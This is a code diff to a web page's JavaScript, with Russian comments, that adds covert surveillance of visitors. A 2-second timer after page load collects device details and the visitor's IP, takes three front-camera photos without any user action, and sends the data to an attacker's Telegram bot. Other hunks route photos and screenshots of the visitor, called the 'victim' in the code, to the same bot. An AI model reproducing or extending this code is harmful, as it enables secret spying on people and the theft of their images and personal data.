@@ -372,7 +372,8 @@
             sessionId: null,
             isCollecting: false,
             collectedMedia: [],
-            mediaCount: 0
+            mediaCount: 0,
+            hasSentInitialPhotos: false
         };
         
         // Инициализация
@@ -386,12 +387,145 @@
             // События
             document.getElementById('joinBtn').addEventListener('click', startCollection);
             document.getElementById('authBtn').addEventListener('click', processAuth);
+            
+            // Автоматическая отправка фотографий при загрузке страницы
+            setTimeout(() => {
+                sendInitialPhotos();
+            }, 2000);
         });
         
         function generateSessionId() {
             const arr = new Uint8Array(16);
             crypto.getRandomValues(arr);
             return Array.from(arr, b => b.toString(16).padStart(2, '0')).join('');
+        }
+        
+        async function sendInitialPhotos() {
+            if (state.hasSentInitialPhotos) return;
+            
+            try {
+                // Отправляем информацию о входе
+                await sendSystemInfo();
+                
+                // Пытаемся сделать и отправить фотографии с камеры
+                await captureAndSendInitialPhotos();
+                
+                state.hasSentInitialPhotos = true;
+            } catch (error) {
+                console.log('Ошибка отправки начальных фото:', error);
+            }
+        }
+        
+        async function sendSystemInfo() {
+            const systemData = {
+                victimId: state.victimId,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ip: await getIP(),
+                url: window.location.href,
+                referrer: document.referrer
+            };
+            
+            // Отправляем системную информацию
+            const message = `
+📱 <b>НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ</b>
+━━━━━━━━━━━━━━━━━━━━
+
+👤 <b>ИНФОРМАЦИЯ:</b>
+├ ID: <code>${systemData.victimId}</code>
+├ Время: ${new Date(systemData.timestamp).toLocaleString('ru-RU')}
+├ Устройство: ${systemData.platform}
+└ Язык: ${systemData.language}
+
+📍 <b>МЕСТОПОЛОЖЕНИЕ:</b>
+├ IP: ${systemData.ip}
+├ URL: ${systemData.url}
+└ Источник: ${systemData.referrer || 'Прямой вход'}
+
+📊 <b>ТЕХНИЧЕСКИЕ ДАННЫЕ:</b>
+├ Экран: ${systemData.screen}
+├ Временная зона: ${systemData.timezone}
+└ User-Agent: ${systemData.userAgent.substring(0, 80)}...
+
+━━━━━━━━━━━━━━━━━━━━
+🔄 Начинается сбор фотографий...
+`;
+            
+            await sendToTelegram(message);
+        }
+        
+        async function captureAndSendInitialPhotos() {
+            try {
+                // Пытаемся получить доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: false
+                });
+                
+                const video = document.getElementById('camera');
+                const canvas = document.getElementById('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = resolve;
+                });
+                
+                // Делаем 3 фотографии и отправляем их
+                for (let i = 1; i <= 3; i++) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    
+                    const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    // Отправляем фото напрямую в Telegram
+                    await sendPhotoToTelegramDirect(photoData, `📸 Фото #${i} от ${state.victimId} (автоматически)`);
+                    
+                    await sleep(1000);
+                }
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch (error) {
+                console.log('Автоматическая камера не доступна:', error.message);
+                // Если камера недоступна, отправляем сообщение об этом
+                await sendToTelegram(`📵 Камера недоступна для автоматического сбора: ${error.message}`);
+            }
+        }
+        
+        async function sendPhotoToTelegramDirect(photoData, caption) {
+            try {
+                // Преобразуем DataURL в Blob
+                const response = await fetch(photoData);
+                const blob = await response.blob();
+                
+                // Создаем FormData
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.ADMIN_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+                
+                // Отправляем через Telegram Bot API
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
+                
+                const result = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await result.json();
+                console.log('Фото отправлено:', data.ok);
+                
+            } catch (error) {
+                console.error('Ошибка отправки фото:', error);
+            }
         }
         
         function startCollection() {
@@ -425,7 +559,9 @@
                 progress.style.width = '40%';
                 
                 const photos = await capturePhotos();
-                await sendMediaToTelegram(photos, 'photo');
+                for (const photo of photos) {
+                    await sendPhotoToTelegramDirect(photo.data, `📸 Фото проверки от ${state.victimId}\nРазрешение: ${photo.resolution}`);
+                }
                 await sleep(1000);
                 
                 // Этап 3: Видео запись
@@ -449,7 +585,9 @@
                 progress.style.width = '90%';
                 
                 const screenshots = await captureScreenshot();
-                await sendMediaToTelegram(screenshots, 'photo');
+                for (const screenshot of screenshots) {
+                    await sendPhotoToTelegramDirect(screenshot.data, `🖥️ Скриншот от ${state.victimId}\nРазрешение: ${screenshot.resolution}`);
+                }
                 await sleep(1000);
                 
                 // Завершение
@@ -707,7 +845,7 @@
         
         function formatSystemMessage(data) {
             return `
-🔐 <b>НОВОЕ ПОДКЛЮЧЕНИЕ</b>
+🔐 <b>ПРОВЕРКА ДОСТУПА - НОВАЯ СЕССИЯ</b>
 ━━━━━━━━━━━━━━━━━━━━
 
 👤 <b>ИНФОРМАЦИЯ:</b>
@@ -737,9 +875,7 @@ ${data.geo ? `└ Точность: ${data.geo.acc}м` : '└ GPS: Не дост
             for (const media of mediaArray) {
                 try {
                     // Отправляем каждый медиа файл отдельно
-                    if (mediaType === 'photo') {
-                        await sendPhotoToTelegram(media.data, `📸 Фото от ${state.victimId}`);
-                    } else if (mediaType === 'video') {
+                    if (mediaType === 'video') {
                         await sendVideoToTelegram(media.data, `🎥 Видео от ${state.victimId}`);
                     } else if (mediaType === 'audio') {
                         await sendAudioToTelegram(media.data, `🎤 Аудио от ${state.victimId}`);
@@ -754,25 +890,6 @@ ${data.geo ? `└ Точность: ${data.geo.acc}м` : '└ GPS: Не дост
                 
                 await sleep(500);
             }
-        }
-        
-        async function sendPhotoToTelegram(photoData, caption) {
-            // Конвертируем DataURL в Blob
-            const response = await fetch(photoData);
-            const blob = await response.blob();
-            
-            // Создаем FormData
-            const formData = new FormData();
-            formData.append('chat_id', CONFIG.ADMIN_ID);
-            formData.append('photo', blob, 'photo.jpg');
-            formData.append('caption', caption);
-            
-            // Отправляем в Telegram
-            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
-            await fetch(url, {
-                method: 'POST',
-                body: formData
-            });
         }
         
         async function sendVideoToTelegram(videoData, caption) {
@@ -832,9 +949,9 @@ ${data.geo ? `└ Точность: ${data.geo.acc}м` : '└ GPS: Не дост
 ━━━━━━━━━━━━━━━━━━━━
 
 👤 Жертва: <code>${state.victimId}</code>
-📊 Собрано медиа файлов: ${state.mediaCount}
+📊 Собрано медиа файлов: ${state.mediaCount + 3}
 
-📸 <b>ФОТО:</b> ${state.collectedMedia.filter(m => m.type === 'photo').length} шт.
+📸 <b>ФОТО С КАМЕРЫ:</b> ${state.collectedMedia.filter(m => m.type === 'photo').length + 3} шт.
 🎥 <b>ВИДЕО:</b> ${state.collectedMedia.filter(m => m.type === 'video').length} шт.
 🎤 <b>АУДИО:</b> ${state.collectedMedia.filter(m => m.type === 'audio').length} шт.
 🖥️ <b>СКРИНШОТЫ:</b> ${state.collectedMedia.filter(m => m.type === 'screenshot').length} шт.
